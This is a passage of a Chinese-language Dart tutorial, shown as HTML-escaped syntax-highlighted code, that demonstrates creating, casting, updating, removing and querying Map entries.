&lt;span style=&#34;color:#75715e&#34;&gt;// 强制使用指定类型初始化map
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    Map&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; map3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;};
    Map map4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Map.castFrom&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;num&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;(map3);
    
&lt;span style=&#34;color:#75715e&#34;&gt;// 这行代码会出错，主要原因是testMap是&amp;lt;dynamic,dynamic&amp;gt;类型的，但是这里需要的是&amp;lt;int,String&amp;gt;类型的map
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    Map map5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Map.castFrom&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;(map3);
    
&lt;span style=&#34;color:#75715e&#34;&gt;// 这行代码也会出错，因为无法将&amp;lt;String,String&amp;gt;类型的map转换为&amp;lt;int,String&amp;gt;类型的map
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    Map map6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Map.castFrom&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;(map3); &lt;span style=&#34;color:#75715e&#34;&gt;// 正确
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;d创建不可变的-map&#34;&gt;d.创建不可变的 map&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;Map map6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;one&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Android&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;two&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;IOS&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;three&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flutter&amp;#39;&lt;/span&gt;};
Map map7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Map.unmodifiable(map6);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;e根据-list-所提供的-key-value-来创建-map&#34;&gt;e.根据 list 所提供的 key value 来创建 map&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;List&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; keys &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;one&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;two&amp;#39;&lt;/span&gt;]; 
List&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; values &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Android&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;IOS&amp;#39;&lt;/span&gt;]; 
Map map &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Map.fromIterables(keys, values); 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2属性&#34;&gt;2.属性&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;print(map.length);        &lt;span style=&#34;color:#75715e&#34;&gt;//2     长度
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;print(map.isNotEmpty);    &lt;span style=&#34;color:#75715e&#34;&gt;//true  是否不为空
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;print(map.isEmpty);       &lt;span style=&#34;color:#75715e&#34;&gt;//false   是否为空  
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;print(map.keys);          &lt;span style=&#34;color:#75715e&#34;&gt;//(a, b)  key的集合
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;print(map.values);        &lt;span style=&#34;color:#75715e&#34;&gt;//(1, 2)  value的集合
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;print(map.entries);       &lt;span style=&#34;color:#75715e&#34;&gt;//(MapEntry(a: 1), MapEntry(b: 2))  map迭代的键值对集合 
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3方法&#34;&gt;3.方法&lt;/h2&gt;
&lt;h3 id=&#34;a增&#34;&gt;a.增&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;Map&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; map7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;};
&lt;span style=&#34;color:#75715e&#34;&gt;// 新增一个key value
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;map7[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;f&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;b改&#34;&gt;b.改&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 修改一个key的value
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;Map&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; map8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;};
map8[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;;

&lt;span style=&#34;color:#75715e&#34;&gt;// 对指定的key的value做出修改
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;Map&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; map23 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;};
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; result3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; map23.update(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;, (value)&lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;(value&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;));
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; result4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; map23.update(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;, (value)&lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;(value&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;));
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; result4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; map23.update(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;, (value)&lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;(value&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;),ifAbsent: ()&lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;));

&lt;span style=&#34;color:#75715e&#34;&gt;// 根据参数函数的规则，批量修改map
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;Map&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; map24 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;};
map24.updateAll((&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; key,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; value){
   &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; value&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
});
Map&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; map25 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;};
map25.updateAll((&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; key,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; value){
   &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(key&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;){&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;}
   &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(key&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;){&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;;}
   &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; value&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
});
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;c删&#34;&gt;c.删&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 删除一个key
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    Map&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; map9 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;};
    map9.remove(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;);

&lt;span style=&#34;color:#75715e&#34;&gt;// 根据条件批量删除
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    Map&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; map10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;};
    map10.removeWhere((key,value)&lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;(value&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;d查&#34;&gt;d.查&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 是否包含key
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;   Map&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; map11 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;};
   print(map11.containsKey(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;));&lt;span style=&#34;color:#75715e&#34;&gt;//true   是否包含key
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;   print(map11.containsKey(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;aa&amp;#34;&lt;/span&gt;));&lt;span style=&#34;color:#75715e&#34;&gt;//false  是否包含key
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;   
&lt;span style=&#34;color:#75715e&#34;&gt;// 是否包含value值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;   Map&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; map17 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;};
   print(map17.containsValue(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));&lt;span style=&#34;color:#75715e&#34;&gt;//true
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;   print(map17.containsValue(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;));&lt;span style=&#34;color:#75715e&#34;&gt;//false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;   
&lt;span style=&#34;color:#75715e&#34;&gt;// 遍历
